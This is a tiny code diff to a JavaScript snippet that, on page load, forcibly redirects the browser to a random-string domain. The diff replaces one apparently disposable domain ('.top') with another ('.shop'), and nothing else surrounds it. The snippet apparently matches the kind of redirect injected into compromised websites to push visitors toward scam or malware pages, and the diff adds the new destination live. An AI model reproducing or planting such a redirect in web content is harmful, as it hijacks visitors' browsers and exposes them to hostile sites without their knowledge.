@@ -1,6 +1,7 @@
 (function() {
-    window['location'] = 'https://mmnmfskhij.top/';
+    window['location'] = 'https://dgnoudshnti5t74jn.shop/';
 })();
+
 
 
 
